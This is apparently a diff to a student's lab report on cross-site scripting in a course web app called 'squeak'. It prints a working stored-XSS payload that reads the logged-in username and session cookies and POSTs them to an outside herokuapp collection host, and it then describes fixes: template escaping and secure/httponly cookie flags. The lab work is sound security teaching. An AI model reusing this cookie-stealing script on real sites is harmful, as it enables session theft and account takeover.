@@ -46,14 +46,21 @@ The first attack with "<script>alert('Owned');</script>" was pretty straightforw
 
 
 To get the cookies I used the following squeak and "squeaked" it 
-<script>
+"<script>
 var xhttp = new XMLHttpRequest();
 console.log(document.getElementsByClassName("input-group-text")[0].innerHTML);
  xhttp.open("POST", "https://dva446.herokuapp.com/store/156", true);
  var username=document.getElementsByClassName("input-group-text")[0].innerHTML;
  xhttp.send(username+":"+document.cookie);
-</script>
+</script>"
 
+I tried to sign in with different users and their data were all sent to "https://dva446.herokuapp.com/store/156" and i could access it to see them.
+
+Countermeasures:
+settings the template engine up wasnt so difficult. But because i made the replacements in two steps: first replacing the values like name, card text etc. for every html snippet, combine them and then replace it in the template file. To simulate similar behaviour I used Mustache.render to render locally.
+Now everything was unescaped correctly.
+
+I also added the secure and httponly flags when i set cookies.
 
 
 todo:
